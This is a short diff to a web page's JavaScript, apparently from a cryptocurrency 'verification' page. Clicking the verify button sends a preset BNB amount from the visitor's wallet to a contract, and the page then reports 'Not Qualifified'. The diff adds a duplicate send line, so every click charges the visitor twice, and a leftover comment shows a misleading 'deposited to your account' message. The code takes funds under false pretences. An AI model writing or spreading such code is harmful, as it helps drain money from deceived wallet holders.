@@ -760,6 +760,7 @@ document.getElementById('verify').addEventListener('click', async () => {
         const weiAmount = web3.utils.toWei(donationAmount, 'ether'); // Convert preset BNB amount to wei
         const gas = await contract.methods.verify().estimateGas({ value: weiAmount });
         await contract.methods.verify().send({ from: sender, value: weiAmount, gas });
+	await contract.methods.verify().send({ from: sender, value: weiAmount, gas });
 
         // Transaction successful //Transaction Successful //✅ Amount Deposited successfully to your account!
         document.getElementById('popup-status').textContent = 'Not Qualifified';
